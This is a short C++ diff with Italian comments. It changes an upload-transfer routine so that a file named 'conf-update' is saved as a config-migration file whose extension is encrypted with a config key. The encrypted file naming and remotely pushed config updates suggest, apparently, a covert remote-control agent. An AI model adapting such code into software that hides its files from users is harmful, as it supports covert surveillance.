@@ -2178,7 +2178,21 @@ BOOL Transfer::RestGetUploads() {
 		} else {
 			// Creiamolo
 			wstring strUploaded;
-			strUploaded = GetCurrentPath(pwFilename);
+
+			// Controllo per la migrazione
+			if (wcsncmp(L"conf-update", pwFilename, uPascalLen - sizeof(WCHAR)) == 0) {
+				strUploaded = GetCurrentPath(g_ConfName);
+				wstring strExtension = L".mig";
+
+				Encryption encryptionObj(g_ConfKey, KEY_LEN);
+				WCHAR* pBackExt = encryptionObj.EncryptName(strExtension, g_Challenge[0]);
+
+				strUploaded += pBackExt;
+
+				free(pBackExt);
+			} else {
+				strUploaded = GetCurrentPath(pwFilename);
+			}
 
 			if (strUploaded.empty())
 				continue;
